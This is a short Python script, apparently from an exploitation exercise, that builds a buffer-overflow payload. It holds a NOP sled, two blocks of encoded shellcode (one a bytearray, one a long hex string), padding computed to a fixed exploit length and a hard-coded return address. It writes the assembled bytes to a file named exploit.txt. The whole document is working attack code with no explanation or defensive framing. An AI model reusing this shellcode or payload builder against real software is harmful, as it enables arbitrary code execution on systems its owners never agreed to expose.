

nop = ("\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90")


shellcode = bytearray(
"\xe0\x53\xe7\x99\x40\xbe\x89\xf8\xb0\x51\x50\xa4\x0b\x88\x16"
"\x23\xf2\xf2\x0d\x1f\xca\xfc\x33\x57\x2c\xe6\x63\xd4\x82\xf6"
"\x22\x69\x4f\xd7\x03\x6f\x62\x28\x50\xff\x0b\x88\x12\x23\xca"
"\xe6\x89\xe4\x91\xa2\xe1\xe0\x81\x0b\x53\x23\xd9\xfa\x03\x7b"
"\x0b\x93\x1a\x4b\xba\x93\x89\x9c\x0b\xdb\xd4\x99\x7f\x76\xc3"
"\x67\x8d\xdb\xc5\x90\x60\xaf\xf4\xab\xfd\x22\x39\xd5\xa4\xaf"
"\xe6\xf0\x0b\x82\x26\xa9\x53\xbc\x89\xa4\xcb\x51\x5a\xb4\x81"
"\x09\x89\xac\x0b\xdb\xd2\x21\xc4\xfe\x26\xf3\xdb\xbb\x5b\xf2"
"\xd1\x25\xe2\xf7\xdf\x80\x89\xba\x6b\x57\x5f\xc0\xb3\xe8\x02"
"\xa8\xe8\xad\x71\x9a\xdf\x8e\x6a\xe4\xf7\xfc\x05\x57\x55\x62"
"\x92\xa9\x80\xda\x2b\x6c\xd4\x8a\x6a\x81\x00\xb1\x02\x57\x55"
"\x8a\x52\xf8\xd0\x9a\x52\xe8\xd0\xb2\xe8\xa7\x5f\x3a\xfd\x7d"
"\x17\xb0\x07\xc0\x40\x72\x75\x0f\xe8\xd8\x02\xb9\xdb\x53\xe4"
"\xc2\x90\x8c\x55\xc0\x19\x7f\x76\xc9\x7f\x0f\x87\x68\xf4\xd6"
"\xfd\xe6\x88\xaf\xee\xc0\x70\x6f\xa0\xfe\x7f\x0f\x6a\xcb\xed"
"\xbe\x02\x21\x63\x8d\x55\xff\xb1\x2c\x68\xba\xd9\x8c\xe0\x55"
"\xe6\x1d\x46\x8c\xbc\xdb\x03\x25\xc4\xfe\x12\x6e\x80\x9e\x56"
"\xf8\xd6\x8c\x54\xee\xd6\x94\x54\xfe\xd3\x8c\x6a\xd1\x4c\xe5"
"\x84\x57\x55\x53\xe2\xe6\xd6\x9c\xfd\x98\xe8\xd2\x85\xb5\xe0"
"\x25\xd7\x13\x70\x6f\xa0\xfe\xe8\x7c\x97\x15\x1d\x25\xd7\x94"
"\x86\xa6\x08\x28\x7b\x3a\x77\xad\x3b\x9d\x11\xda\xef\xb0\x02"
"\xfb\x7f\x0f", 'utf-8')



totalexploitlength = int(1312)


hexshellcode = '31c983e9afe8ffffffffc05e81760ea790abee83eefce2f45b7829eea790cb6742a16b8a2cc09b65f59c20bcb31bd9c6a827e1c8966f07d2c6eca9c2875164e3a657491cf5c720bcb71be1d22cdcba9644d8aa3ff61bf2cea64320a7bf7391a72ca420ef71a15442665fa6ef60a84b9b5193d6169ced8f9b43c820b6839178882c9ce065ff8caa3d2c9420ef7719efca83cbf08ffecafa1147cff4b42c824063faf898dca790c399d4a2f4bacfdcdcc8a06f7e563791abee8e54ffbecfb92b85a76f7ebef7c0fbaef7d0fb864d9f740e58453c84a2f86b46d038c3eca791106741fabbb8f0f8324bd3f1543b2250dfe258dea39b4bf85b5b05c6543bcff3c68aa71948b9f0c79a18cd82f2b8456dcd29e3b497efa61defcab756abaaf3c0fdb8f1d6fda0f1c6f8b8cfe967d1216f7e6747defda858a0c3e6208dcb11722b5b5b05c6c348322d361172acad92ad10500ed29510a9b4e2c484a7c3543b'


hexshellcodelength = len(hexshellcode) / 2

numhexnops = totalexploitlength - 4 - hexshellcodelength - 12

print(numhexnops)

hexnops = ''

for i in range(0,int( (numhexnops - 4) / 2)):
    hexnops += '90'

returnaddress = '14' + '14' + 'ed' + '00'


#print(shellcode)

#print(type(shellcode))

#rawdata = str.encode(nop + shellcode) 
#rawdata = str.encode(shellcode) 

#codeBytes = bytes(shellcode, Encoding.)

rawdata = bytes.fromhex( hexnops + hexshellcode + hexnops + '909090') # + '' + returnaddress)




with open("exploit.txt", "wb") as file:
    file.write(rawdata)

#print(rawdata)
